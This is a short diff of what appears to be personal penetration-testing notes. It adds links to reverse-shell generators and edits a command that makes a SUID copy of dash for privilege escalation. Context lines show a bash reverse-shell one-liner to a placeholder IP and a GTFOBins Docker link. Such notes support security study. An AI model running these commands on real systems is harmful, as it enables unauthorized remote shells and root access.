@@ -1599,6 +1599,13 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 
 
+Generator
+
+https://www.revshells.com/
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 
+
+
 *Docker*
 
 https://gtfobins.github.io/gtfobins/docker/ 
@@ -1649,7 +1656,7 @@ Replace it with C script
 
 Dash doesn't lose the SUID Bit
 
-    cp /bin/dash /tmp/ippsec3; chmod 6755 /tmp/ippsec3; /bin/dash;
+    cp /bin/dash /tmp/ippsec3; chmod +s /tmp/ippsec3; /bin/dash;
     6 is for users and group 
 
 
